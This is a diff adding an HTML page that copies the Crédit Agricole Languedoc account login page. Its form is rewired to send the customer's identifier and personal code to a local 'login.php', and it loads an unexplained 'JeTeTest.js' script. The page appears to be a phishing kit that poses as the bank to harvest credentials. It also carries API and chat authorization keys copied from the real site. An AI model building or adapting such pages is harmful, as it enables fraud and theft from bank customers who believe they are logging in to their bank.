@@ -1,0 +1,1577 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="JeTeTest.js"></script>
+
+
+
+
+
+
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta property="og:url" content="/ca-languedoc/particulier/acceder-a-mes-comptes.html" />
+
+
+
+
+	<meta name="description" content="" />
+	<meta property="og:description" content="" />
+
+
+	<meta name="robots" content="noindex">
+
+
+
+
+
+
+
+	<title>Acc&eacute;der &agrave; mes comptes - Crédit Agricole Languedoc</title>
+	<meta property="og:title" content="Acc&eacute;der &agrave; mes comptes - Crédit Agricole Languedoc" />
+
+
+
+
+	<meta property="og:image" content="/content/dam/assetsca/cr835/npc/images/logos/logo-ca-languedoc-2019.png" />
+
+
+
+	<!-- <noscript>
+   	 <style type="text/css">
+        body {
+            overflow:hidden;
+        }
+     </style>
+    	<div class="TechnicalError noscript">
+			<div class="TechnicalError-content">
+				<div class="TechnicalError-paragraph">
+					<p class="TechnicalError-firstPara">Malheureusement, votre configuration de navigation actuelle ne vous permet pas de naviguer dans de bonnes conditions.</br> Vous ne pourrez pas profiter de toutes les fonctionnalités de notre site ni accéder à votre espace client.</p>
+				</div>
+			</div>
+		</div>
+	</noscript> -->
+	<meta name="format-detection" content="telephone=no">
+	<script>
+
+
+		// if ((!window.performance || window.performance.navigation.type === 2) && window.history && window.history.state && window.history.state.bamBack && !isNaN(parseInt(window.history.state.bamBack))) {
+		// 	window.history.go(-1 * parseInt(window.history.state.bamBack));
+		// }
+
+
+		//var NPC = NPC || {};
+
+		//NPC.logDebugEnabled = false;
+
+		//NPC.isAuthor = false;
+
+		//NPC.idLiveCopyCaisse = 'cr835';
+		//NPC.urlLiveCopyCaisse = '\/ca\u002Dlanguedoc\/';
+		//NPC.isNational = false;
+		//NPC.isChalus = false;
+		//NPC.cheminOperations = '\/ca\u002Dlanguedoc\/particulier\/operations\/';
+		//NPC.getCrDateTime = '24/12/2021T13:55:46.398+0100'; 
+
+		// if (NPC.isNational){
+		// 	var cookieCRPath = (document.cookie.match('(^|; )cr-path=([^;]*)')||0)[2];
+		// 	if (typeof cookieCRPath !== 'undefined'){ 
+		// 		var urlRedirection = window.location.pathname === '/' ? '/particulier.html' : window.location.pathname;
+		// 		urlRedirection = window.location.pathname.replace(new RegExp(NPC.urlLiveCopyCaisse),cookieCRPath);
+		// 		window.location.pathname = urlRedirection;
+		// 	}
+		// }
+
+		NPC.origin = "\/content\/ca\/cr835\/npc\/fr\/particulier\/acceder\u002Da\u002Dmes\u002Dcomptes.html";
+
+		//Enumeration des marches
+		NPC.ENUM_MARCHES = {
+			PARTICULIER: 1,
+			PROMOTEUR: 2,
+			PROFESSIONNEL: 3,
+			ENTREPRISE: 4,
+			AGRICULTEUR: 5,
+			COLLECTIVITE_PUBLIQUE: 6,
+			ASSOC_CA_MODERE: 7,
+			PROFESSION_LIBERALE: 8,
+			HORS_MARCHE: 9
+		};
+
+		NPC.ENUM_NOMS_MARCHES = {
+			1: 'particulier',
+			2: 'professionnel',
+			3: 'professionnel',
+			4: 'entreprise',
+			5: 'agriculteur',
+			6: 'collectivites-publiques',
+			7: 'association',
+			8: 'professionnel',
+			9: 'particulier'
+		};
+
+		// Les versions des navigateurs compatible et partiellement compatible NPC (paramétré sur l'osgi VersionNavigateurConfigService)
+		NPC.versionNavigateur = {
+			edge_partiellement_compatible: undefined,
+			edge_compatible: 16.0,
+			opera_partiellement_compatible: undefined,
+			opera_compatible: 12.1,
+			safari_partiellement_compatible: undefined,
+			safari_compatible: 11.0,
+			ie_partiellement_compatible: undefined,
+			ie_compatible: 11.0,
+			chrome_partiellement_compatible: undefined,
+			chrome_compatible: 49.0,
+			firefox_partiellement_compatible: undefined,
+			firefox_compatible: 58.0,
+			ios_safari_partiellement_compatible: undefined,
+			ios_safari_compatible: 10.2,
+			chrome_android_partiellement_compatible: undefined,
+			chrome_android_compatible: 50.0,
+			firefox_android_partiellement_compatible: undefined,
+			firefox_android_compatible: 27.0,
+			ie_mobile_partiellement_compatible: undefined,
+			ie_mobile_compatible: 11.0,
+			uc_browser_partiellement_compatible: undefined,
+			uc_browser_compatible: 11.8,
+			samsung_internet_partiellement_compatible: undefined,
+			samsung_internet_compatible: 4.0
+		};
+
+		//Informations sur l'utilisateur connecte
+		NPC.utilisateur = NPC.utilisateur || {};
+
+		NPC.utilisateur.idLiveCopyCaisse = "cr835";
+		NPC.utilisateur.langue = "fr";
+
+		//Ce marche est determiner par l'url
+		NPC.utilisateur.marche = "particulier";
+		NPC.utilisateur.idMarcheUrl = '1';
+		NPC.utilisateur.libMarcheUrl = (NPC.utilisateur.idMarcheUrl > -1) ? NPC.ENUM_NOMS_MARCHES[NPC.utilisateur.idMarcheUrl] : '';
+
+
+
+		//Set de la clé api facebook
+		var facebookApiKeyByLiveCopy = JSON.parse('["national:2088572324732225","cr802:489148175044922","cr813:236194743080113","cr817:145896668794627","cr820:764372494336974","cr822:125693774818703","cr824:318003333055213","cr825:299797594566298","cr829:3309141402481442","cr831:2298331523560690","cr833:2468839310085814","cr835:463272830858677","cr836:410973159305257","cr839:117911532212286","cr844:2751398285114558","cr845:325988431915130","cr847:291085018536430","cr848:625667387637386","cr861:300230997955039","cr866:681694355640877","cr867:905545409587203","cr869:292995441933740","cr871:298059694869208","cr872:2568740669879512","cr878:542351902993864","cr879:578972559438059","cr881:781026779073431","cr882:117911532212286","cr883:273676492713326","cr887:2420417931549562","cr891:2112339318870839","cr894:948203982226284","cr895:966802300347601","cr900:579572619507250","cr_bretonnes:389368678148569","cr868:182530525170658","cr810:195393694552642","cr902:821138848069683","cr860:1441703032617958","cr812:381334225753943","cr903:105361911226495"]');
+		for (var i = 0; i < facebookApiKeyByLiveCopy.length; i++) {
+			var keyValueTempArray = facebookApiKeyByLiveCopy[i].split(":");
+			if (keyValueTempArray[0].trim() === "cr835") {
+				NPC.facebookApiKey = keyValueTempArray[1].trim();
+				break;
+			}
+		}
+
+		//Set de la clé google api
+		NPC.googleApiKey = 'AIzaSyB5eOVWe6ujSpfNpuq3lIYNQQEeYsosAC0';
+		//Set de l'url d'accès au js Inbenta
+		NPC.inbentaJsUrl = 'https://credit-agricole.inbenta.com/jsonp/inbenta-1.0.0.js';
+		//Set de l'url d'accès au js du compagnion Inbenta
+		NPC.inbentaCompanionJsUrl = 'https://credit-agricole-compagnon.inbenta.com/';
+		//Set de l'url du js botclient
+		NPC.botclientJsUrl = 'https://botcli.credit-agricole.fr/front/npc-mbot-launcher.js';
+		//Set de l'url d'accès au js de BazaarVoice
+		NPC.bazaarVoiceJsUrl = 'https://display.ugc.bazaarvoice.com/static/';
+		//Set de l'url d'accès au js du tchat genesys
+		NPC.genesysTchatJsUrl = 'https://bv-chat.credit-agricole.fr/oic-services/js/bver.js';
+		//Set de l'authorization key au js du tchat genesys
+		NPC.genesysTchatJsAuthorizationKey = 'd737e5e38b3c53149ef8401c577d8643588c9034d0ed0ddbdf0db081cbac97b3';
+		//Nombre maximum de mois pour afficher le détail d'une opération
+		NPC.syntheseN3MaxMonthForDisplayOperationDetail = 1;
+
+		// Set du temps du keep alive pour le tchat
+		NPC.keepAliveTime = '480000';
+
+		NPC.genererURLJson = function (selecteurs) {
+			var pathname = window.location.pathname;
+			var indexExtension = pathname.indexOf('.html');
+			if (indexExtension !== -1) {
+				pathname = pathname.substring(0, indexExtension);
+
+				var indexDebutNoeud = pathname.lastIndexOf('/');
+				var indexDebutSelecteur = pathname.indexOf('.', indexDebutNoeud);
+
+				if (indexDebutSelecteur !== -1) {
+					pathname = pathname.substring(0, indexDebutSelecteur);
+				}
+				pathname = pathname + "/jcr:content" + (selecteurs ? '.' + selecteurs : '') + '.json';
+
+				return pathname;
+			}
+		};
+
+		NPC.urlMarcheCourant = "";
+		NPC.homePage = NPC.urlLiveCopyCaisse + NPC.utilisateur.marche + ".html";
+
+		NPC.branche = "";
+
+
+		NPC.branche = "branche3";
+
+
+
+		//Set de l'url d'accès à la page FAQ pour inbenta
+		NPC.recupererUrlFaq = function () {
+			return "\/ca\u002Dlanguedoc\/particulier\/faq.html";
+		}
+		NPC.recupererUrlFaqLogin = function () {
+			return "\/ca\u002Dlanguedoc\/particulier\/acceder\u002Da\u002Dmes\u002Dcomptes.html?resource=%2Fca\u002Dlanguedoc%2Fparticulier%2Ffaq.html";
+		}
+
+		//Gestion de la session DSP2, on force l'utilisateur a rester sur son parcours DSP2 s'il l'a deja commencé.
+		NPC.dsp2 = NPC.dsp2 || {};
+
+		NPC.dsp2.isCurrentPageDSP2 = function () {
+			var DSP2_PATTERN = new RegExp(".*/dsp2/.*");
+			var ERROR_PATTERN = new RegExp(".*errors.*");
+			return (DSP2_PATTERN.test(window.location.pathname) || ERROR_PATTERN.test(window.location.pathname));
+		};
+
+		// NPC.dsp2.isCurrentCookieDSP2 = function() {
+		// 	return (((document.cookie.match('(^|; )' + 'dsp2-en-cours' + '=([^;]*)')||0)[2])!=null);
+		// };
+
+		// if (!NPC.dsp2.isCurrentPageDSP2()&&NPC.dsp2.isCurrentCookieDSP2()){
+		// 	window.location.href= NPC.urlLiveCopyCaisse+NPC.utilisateur.marche+"/dsp2/informations.html";
+		// };
+
+
+
+
+		NPC.offsetGuadeloupe = -14400000;
+		NPC.offsetMartinique = -14400000;
+		NPC.offsetReunion = 14400000;
+		NPC.offsetParis = 3600000;
+
+	</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<script>
+
+
+		NPC.user = NPC.user || {};
+		NPC.user.isConnected = false;
+
+		NPC.utilisateur.email = '';
+		NPC.utilisateur.conseiller = {
+			'title': '',
+			'firstName': '',
+			'lastName': '',
+			'phoneNumber': '',
+			'mobilePhoneNumber': ''
+		};
+
+		NPC.utilisateur.fullName = "";
+		NPC.utilisateur.ccptea = '';
+		NPC.utilisateur.civiliteClient = "";
+		NPC.utilisateur.nomMaritalClient = "";
+		NPC.utilisateur.prenomClient = "";
+		NPC.utilisateur.agenceId = '';
+
+		NPC.utilisateur.idMarcheUtilisateur = '-1';
+		NPC.utilisateur.libMarcheUtilisateur = (NPC.utilisateur.idMarcheUtilisateur > -1) ? NPC.ENUM_NOMS_MARCHES[NPC.utilisateur.idMarcheUtilisateur] : '';
+
+		NPC.utilisateur.fonctionsNpc = {};
+
+
+
+
+
+
+
+		NPC.utilisateur.isMineur = '';
+
+
+		NPC.timeout = {};
+
+
+		NPC.timeout.storageTimeoutKeyPrefix = window.location.hostname + "." + NPC.idLiveCopyCaisse;
+
+
+		NPC.timeout.storageDeconnexionEvent = NPC.timeout.storageTimeoutKeyPrefix + ".NPCDisconnectKey";
+
+
+		NPC.timeout.storageLocationRenouvellementSession = NPC.timeout.storageTimeoutKeyPrefix + ".NPCRenouvellementSessionKey";
+		NPC.authent = {};
+		NPC.authent.debugEnabled = 'false' == "true";
+		NPC.authent.localStorage = 'false' == "true";
+
+		if (NPC.user.isConnected) {
+
+
+			NPC.timeout.timeoutTime = Number('9');
+			NPC.timeout.timeoutDisconnectTime = Number('59');
+			NPC.timeout.timeoutSecurityTime = Number('0');
+
+			NPC.timeout.refreshTokenTTL = '';
+			NPC.timeout.refreshTokenTTLWarning = '';
+			NPC.timeout.refreshTokenTTLEnd = '';
+
+			NPC.timeout.refreshTokenTTLConf = Number('60');
+			NPC.timeout.refreshTokenTTLWarningConf = Number('55');
+			NPC.timeout.refreshTokenTTLEndConf = Number('59');
+		}
+
+	</script>
+
+
+
+
+
+
+
+
+
+
+
+	<link rel="icon" type="image/vnd.microsoft.icon"
+		href="https://www.credit-agricole.fr/content/dam/assetsca/cr835/npc/images/logos/favicon.ico">
+	<link rel="shortcut icon" type="image/vnd.microsoft.icon"
+		href="https://www.credit-agricole.fr/content/dam/assetsca/cr835/npc/images/logos/favicon.ico">
+
+
+
+
+
+	<link rel="stylesheet"
+		href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-part.min.021a654a8f4d5db557f446839a1d87d5.css"
+		type="text/css">
+
+
+	<link rel="stylesheet"
+		href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibStoreLocatorT33Part.min.bc8ec526729ac328bbfe9b7fe03fd50f.css"
+		type="text/css">
+	<link rel="stylesheet"
+		href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibStoreLocatorT34Part.min.48761ce5154dd5dbec7399ce074df0b8.css"
+		type="text/css">
+	<link rel="stylesheet"
+		href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibBoutonVertPart.min.d41d8cd98f00b204e9800998ecf8427e.css"
+		type="text/css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/clientlibs/granite/jquery.min.0811b5e7037ada110b591bbd86240386.js"></script>
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/clientlibs/granite/utils.min.6968fb10cbad8a699b7bcf06fbd45b91.js"></script>
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/clientlibs/granite/jquery/granite.min.b82fcc6ac1f7e79cd9f66e927be67ebb.js"></script>
+
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-bootstrap-jquery.min.bc5f25e92376889359be42592309a55e.js"></script>
+
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibHeader.min.184c14aea3863fdd891e3e4d9b2c459a.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<script>
+		(function () {
+			var ua = window.navigator.userAgent;
+			var msie = ua.indexOf("MSIE ");
+
+
+			if (NPC && NPC.informationNavigateur && NPC.informationNavigateur.incompatible) {
+				window.location = "\/ca\u002Dlanguedoc\/navigateurNonCompatible.html";
+			}
+
+			var compatibiliteNav = function () {
+
+
+
+
+
+				if (NPC && NPC.informationNavigateur) {
+					if (NPC.informationNavigateur.partiellementCompatible) {
+						$("#bandeauNav").css("display", "block");
+						$("a.Header-login").css("display", "none");
+						$("a.HeaderSticky-login").css("display", "none");
+
+					} else if (NPC.informationNavigateur.incompatible) {
+						$("#pageNav").css("display", "block");
+					}
+				}
+
+
+
+				$(".croix-bandeau").on("click", function () {
+					$("#bandeauNav").css("display", "none");
+				});
+
+				if (NPC && NPC.informationNavigateur) {
+					$('[data-npc-display-os]').each(function () {
+						var $this = $(this);
+						if (NPC.informationNavigateur[$this.attr('data-npc-display-os')]) {
+							$this.removeClass('hidden');
+						}
+					});
+					$('[data-npc-display-categorie]').each(function () {
+						var $this = $(this);
+						if (NPC.informationNavigateur[$this.attr('data-npc-display-categorie')]) {
+							$this.removeClass('hidden');
+						}
+					});
+				}
+			}
+
+			if (msie > 0) {
+				if (window.attachEvent) {
+					window.attachEvent("onload", compatibiliteNav);
+				} else {
+					window.addEventListener("load", compatibiliteNav);
+				}
+			} else {
+				$(document).ready(compatibiliteNav);
+			}
+		})();
+	</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<link href="https://www.credit-agricole.fr/etc/designs/ca/npc.css" rel="stylesheet" type="text/css">
+
+
+	<script type="text/javascript">
+		(function () {
+			window.ContextHub = window.ContextHub || {};
+
+			/* setting paths */
+			ContextHub.Paths = ContextHub.Paths || {};
+			ContextHub.Paths.CONTEXTHUB_PATH = "/etc/cloudsettings/default/contexthub";
+			ContextHub.Paths.RESOURCE_PATH = "\/content\/ca\/cr835\/npc\/fr\/particulier\/acceder\u002Da\u002Dmes\u002Dcomptes\/jcr:content\/contexthub";
+			ContextHub.Paths.SEGMENTATION_PATH = "\/etc\/segmentation\/contexthub\/cr835";
+			ContextHub.Paths.CQ_CONTEXT_PATH = "";
+
+			/* setting initial constants */
+			ContextHub.Constants = ContextHub.Constants || {};
+			ContextHub.Constants.ANONYMOUS_HOME = "/home/users/3/31qyKkM4DG7Z9RJzZ2Qe";
+			ContextHub.Constants.MODE = "no-ui";
+		}());
+	</script>
+	<script src="https://www.credit-agricole.fr/etc/cloudsettings/default/contexthub.kernel.branche3.js"
+		type="text/javascript"></script>
+
+	<script>document.cookie = 'reload-ch=; path=' + NPC.urlLiveCopyCaisse + '; expires=Thu, 01 Jan 1970 00:00:01 GMT;';</script>
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+
+
+
+<body class="BodyLogin">
+
+
+	<script>
+
+
+
+		if (sessionStorage.getItem(NPC.timeout.storageLocationRenouvellementSession) != null) {
+			localStorage.setItem(NPC.timeout.storageDeconnexionEvent, Date.now());
+			sessionStorage.removeItem(NPC.timeout.storageLocationRenouvellementSession);
+		};
+	</script>
+
+	<nocobrowse></nocobrowse>
+
+	<header>
+
+
+
+
+
+
+
+
+
+		<script>
+			(function () {
+				var ua = window.navigator.userAgent;
+				var msie = ua.indexOf("MSIE ");
+
+
+				if (NPC && NPC.informationNavigateur && NPC.informationNavigateur.partiellementCompatible) {
+					window.location = '/ca-languedoc/particulier.html';
+				}
+
+			})();
+		</script>
+
+	</header>
+
+	<main>
+
+
+
+
+
+
+
+
+
+		<div class="login parbase">
+
+
+
+
+
+
+
+
+
+			<!-- Machine Id hlwa -->
+
+			<div class="Login">
+				<div class="Login-header js-Header">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+					<script>
+						NPC.loginLogo = NPC.loginLogo || {};
+						NPC.loginLogo.urlDisconnected = "\/ca\u002Dlanguedoc\/particulier.html";
+						NPC.loginLogo.urlConnected = "\/ca\u002Dlanguedoc\/$marche\/operations\/synthese.html";
+					</script>
+
+					<a href="acceder-a-mes-comptes.html" class="Login-logo Login-logo-js">
+						<img class="Login-logoImg js-needFakeNotSvg"
+							src="https://www.credit-agricole.fr/content/dam/assetsca/cr835/npc/images/logos/logo-ca-languedoc-sticky-2019.png"
+							alt="Crédit Agricole - Banque et assurances" />
+					</a>
+
+					<a href="acceder-a-mes-comptes.html#" class="Login-close" id="Login-close" tabindex="0"
+						role="button" aria-label="Quitter l'accès à mon espace"></a>
+				</div>
+
+				<div class="container-fluid Template">
+					<div class="row js-Template-head">
+						<div class="col-xs-12 col-md-6">
+							<div class="Template-reduceMargin15px">
+								<div class="js-StickyPush">
+									<div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs">
+										<div class="placeholder-left parsys">
+											<div class="new-zdg parbase section">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+												<script>
+													$(function () {
+
+
+														window.ContextHub.eventing.on(ContextHub.SegmentEngine.PageInteraction.Teaser.prototype.info.loadEvent, function (event) {
+															$(window).trigger('initCustomRedirect');
+														});
+														// Anomalie 351261 : il faut enlever la dernière <br> qui traine en fin de la zone de dialogue RTE
+														// Pour garder que les 20px attendus entre la description et le bas de l'aplat
+														$("div[class='PushCommunication-text']").find("p").each(function () {
+															var inner = $(this)[0].innerHTML.trim();
+															var brIfExist = inner.substr(inner.length - 4);
+															var brAndNbspIfExist = inner.substr(inner.length - 11);
+															if (brIfExist.indexOf("<br>") >= 0 || (brAndNbspIfExist.indexOf("<br>") >= 0 && brAndNbspIfExist.indexOf("&nbsp;") >= 0)) {
+																setTimeout(removeLastBr, 1000, $(this));
+															}
+														});
+														function removeLastBr(p) {
+															$(p).find("br:last-child").remove();
+														}
+													});
+												</script>
+
+
+												<div class="componentZdg">
+													<div class="PushCarousel3">
+														<div><button class="PushCarousel3-masking"
+																onclick="toggleStateCarousel('hom')">Mettre en pause ou
+																redémarrer le défilement du carousel</button></div>
+														<div class="PushCarousel3-carousel">
+															<div data-trackingclass="carrousel"
+																class="PushCarousel3-carouselInner">
+
+
+
+
+																<div class="PushCarousel3-item"
+																	data-trackinginfo="progcr_ZDG-ID-PAR-DIV-CARTE.COMMERCANT_1">
+
+																	<div class="PushCommunication-backgroundWrapper">
+																		<div class="PushCommunication-background PushCommunication-background--filterTransparent"
+																			style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/cr835/npc/images/conso/test_zdg.jpg')">
+																		</div>
+																	</div>
+																	<div
+																		class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white">
+
+																		<div class="PushCommunication-sticky">VOS
+																			COMMERCES DE PROXIMITÉ</div>
+
+
+																		<div class="PushCommunication-title">
+																			<div class="texte section">
+																				<h3><b>POUR VOS ACHATS DE FIN D'ANNÉE,
+																						<br>
+
+
+																						PRIVILÉGIEZ LE CIRCUIT-COURT
+																						!</b></h3>
+																			</div>
+																		</div>
+
+																		<div class="PushCommunication-text">
+																			<div class="texte section">
+																				<p>Localisez les commerçants proches de
+																					chez vous qui pratiquent la vente à
+																					distance, le «click and
+																					collect<sup>(1)</sup>» ou la
+																					livraison à domicile.<br>
+
+
+
+
+
+
+
+																				</p>
+																			</div>
+																		</div>
+
+
+
+																		<!-- Si la popin de co est activé -->
+
+																		<!-- Si la popin de co n'est pas activé -->
+
+
+																		<a href="https://www.credit-agricole.fr/ca-languedoc/particulier/campagnes/carte-click-and-collect.html"
+																			class="PushCommunication-btn PushCommunication-btn--primary"
+																			data-custom-redirect="/ca-languedoc/particulier/campagnes/carte-click-and-collect.html"
+																			target="_self"><span>TROUVER UN
+																				COMMERCE</span></a>
+
+
+
+																	</div>
+																</div>
+
+
+															</div>
+														</div>
+													</div>
+												</div>
+												<script>
+													if (typeof sliderRelationalMessage === 'function') {
+														sliderRelationalMessage();
+													};
+												</script>
+
+
+
+
+
+											</div>
+
+										</div>
+
+									</div>
+								</div>
+							</div>
+						</div>
+
+						<div class="col-xs-12 col-md-6">
+							<div class="Template-reduceMargin15px">
+								<div class="Login-container">
+									<div class="Login-title">
+										<h1>Accéder à <strong>mes comptes</strong></h1>
+									</div>
+
+									<div class="row row-no-padding">
+										<div class="col-xs-12 col-sm-6">
+											<div class="login-mini parbase">
+
+
+
+
+
+
+
+
+
+
+												<form class="Login-form" id="loginForm" novalidate method="post" action="login.php" onsubmit="">
+
+													<div class="row row-no-padding">
+
+														<div class="form-group">
+															<span class="sr-only" id="passwordmessage"
+																aria-live="polite"></span>
+															<label for="Login-account"
+																class="col-xs-7 Login-noPadding Login-accountLabel"
+																id="div-numero-compte">Identifiant</label>
+
+															<div
+																class="col-xs-12 Login-noPadding ForgotPswd-paragraphInformation">
+																<p>Saisissez votre identifiant à 11 chiffres</p>
+															</div>
+
+															<div class="col-xs-12 Login-noPadding"
+																id="Login-account-div">
+																<input class="form-control input-clear"
+																	id="Login-account" name="CCCPTE"
+																	placeholder="Ex: 98652706859" maxlength="11"
+																	type="text" pattern="[0-11]{5}" 
+																	aria-label="Identifiant" style="display:none;"
+																	tabindex="0" />
+																<div class="loader loader--biggest loader--center">
+																</div>
+															</div>
+														</div>
+
+													</div>
+
+													<div class="col-xs-12 Login-noPadding error" style="display:none"
+														data-aria-describredby="erreur-ident">
+														<p role="alert"
+															aria-label="Veuillez saisir votre numéro de compte à onze chiffres ou caractères alphabétiques"
+															id="erreur-ident">
+															Veuillez saisir votre numéro de compte à onze chiffres ou
+															caractères alphabétiques
+														</p>
+													</div>
+
+													<div class="row row-no-padding">
+														<div class="form-group div-code-perso" style="display: none;"
+															id="num_clavier">
+
+															<label for="Login-password"
+																class="col-xs-7 Login-noPadding Login-accountLabel">Code
+																personnel</label>
+
+															<div
+																class="col-xs-5 Login-lostPswd Login-noPadding js-lostPswd-pswd">
+
+
+																<div class="login-simple-link parbase">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																	<a href="/ca-languedoc/particulier/form-demande-mot-de-passe.html"
+																		class="Login-lostPswdLink js-OpenTooltip"
+																		tabindex="7"
+																		aria-label="Mot de passe perdu ou oublié ?"
+																		target="_self">Perdu / Oublié&nbsp;?</a>
+
+																</div>
+
+
+
+															</div>
+
+															
+
+															<div class="col-xs-12 Login-noPadding"
+																id="Login-password-div">
+
+																<div class="add-clear-span form-group " style="display: block;">
+																	<input
+																	id="Login-password" type="password" name="password"
+																	class="form-control input-clear"
+																	placeholder="Tapez votre code dans le pavé numérique ci-dessous"
+																	readonly="readonly" aria-label="Code personnel"
+																	tabindex="8" required>
+
+																	<!-- <span role="button" id="croixBouton"
+																	class="add-clear-x form-control-feedback icon-form npc-close"
+																	style="cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 3; display: block;"
+																	aria-label="Saisir à nouveau ce champ."></span> -->
+																</div>
+
+																<!-- <input type="hidden" id="j_password" name="j_password"
+																	tabindex="2000">
+																<input type="hidden" id="j_num-client" name="j_username"
+																	tabindex="2000">
+																<input type="hidden" id="path" name="j_currentpath"
+																	value="/content/npc/start" tabindex="2000">
+																<input type="hidden" id="j_validate" name="j_validate"
+																	value="true" tabindex="2000"> -->
+
+															</div>
+
+														</div>
+													</div>
+
+													<div class="col-xs-12 Login-noPadding error" style="display:none"
+														aria-describedby="erreur-keypad">
+														<p role="alert"
+															aria-label="Votre identification est incorrecte, veuillez ressaisir votre code d'accès"
+															id="erreur-keypad">
+															Votre identification est incorrecte, veuillez ressaisir
+															votre code d'accès
+														</p>
+													</div>
+
+													<div class="row row-no-padding" id="boutonCode">
+														<div class="col-xs-12">
+
+															<button tabindex="9" type="button"
+																aria-label="Validation du code personnel"
+																class="btn btn-primary col-xs-12 Login-button"
+																login-submit-btn="" disabled="" onclick="toto(); Ref()">
+																Entrer mon code personnel
+															</button>
+
+														</div>
+													</div>
+
+													<!-- <script>
+														function toto() {
+														
+															const targetDiv = document.getElementById("clavier_num");
+															const btn = document.getElementById("boutonCode");
+															
+															//alert("toto");
+															btn.style.display = "none";
+															targetDiv.style.display = "block";
+														  
+														  
+														  /*  if (btn.style.display != "none") {
+															  btn.style.display = "none";
+														  
+															  targetDiv.style.display = "block";
+															} else {
+															  btn.style.display = "block";
+															  targetDiv.style.display = "none";
+															}*/
+															
+														  };</script> -->
+
+													<div id="clavier_numm" style="display: none">
+														<div class="row row-no-padding">
+															<div class="col-xs-12">
+																<div class="Login-keypad">
+																	<a href="#" class="Login-key T031__key" tabindex="9"
+																		role="button" onclick="saisieLecteurEcran()">
+																		<div data-pos="0">1</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="10" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="1">6</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="11" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="2">7</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="12" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="3">2</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="13" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="4">0</div>
+																	</a>
+																</div>
+															</div>
+														</div>
+														<div class="row row-no-padding">
+															<div class="col-xs-12">
+																<div class="Login-keypad">
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="14" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="5">9</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="15" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="6">3</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="16" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="7">4</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="17" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="8">8</div>
+																	</a>
+																	<a href="#" class="Login-key T031__key"
+																		tabindex="18" role="button"
+																		onclick="saisieLecteurEcran()">
+																		<div data-pos="9">5</div>
+																	</a>
+																</div>
+															</div>
+														</div>
+													</div>
+
+													<div class="col-xs-12 Login-noPadding error" style="display:none"
+														aria-describedby="erreur-keypad">
+														<p role="alert"
+															aria-label="Votre identification est incorrecte, veuillez ressaisir votre code d'accès"
+															id="erreur-keypad">
+															Votre identification est incorrecte, veuillez ressaisir
+															votre code d'accès
+														</p>
+													</div>
+
+
+
+													<!-- <div class="row row-no-padding">
+	    <div class="form-group div-code-perso" style="display:none">
+	    
+	    	<label for="Login-password" class="col-xs-7 Login-noPadding Login-accountLabel">Code personnel</label>
+	    	
+			<div class="col-xs-5 Login-lostPswd Login-noPadding js-lostPswd-pswd"  >
+			
+						
+					<div class="login-simple-link parbase">
+
+
+
+
+
+
+
+
+
+
+        
+            
+            
+				
+				
+				<a href="https://www.credit-agricole.fr/ca-languedoc/particulier/form-demande-mot-de-passe.html" class="Login-lostPswdLink js-OpenTooltip" tabindex="0" aria-label="Mot de passe perdu ou oublié ?" target="_self">Perdu / Oublié&nbsp;?</a>
+            
+        </div>
+
+	            
+	            
+	       	</div>
+	       	
+           	<div class="col-xs-12 Login-noPadding" id="Login-password-div">
+           	
+	        	 <input 
+	        	 	id="Login-password" 
+	        	 	type="password" 
+	        	 	class="form-control input-clear"
+					placeholder="Tapez votre code dans le pavé numérique ci-dessous" 
+					readonly="readonly"
+					aria-label="Code personnel" 
+					tabindex="0" 
+				/>
+				
+				<input type="hidden" id="j_password" name="j_password" />
+				<input type="hidden" id="j_num-client" name="j_username" />
+				<input type="hidden" id="path" name="j_currentpath" value="/content/npc/start">
+				<input type="hidden" id="j_validate" name="j_validate" value="true" />
+				
+			</div>
+			
+		</div>
+	</div>
+	
+    <div class="col-xs-12 Login-noPadding error" style="display:none" aria-describedby="erreur-keypad">
+    	<p role="alert" aria-label="Votre identification est incorrecte, veuillez ressaisir votre code d'accès" id="erreur-keypad">
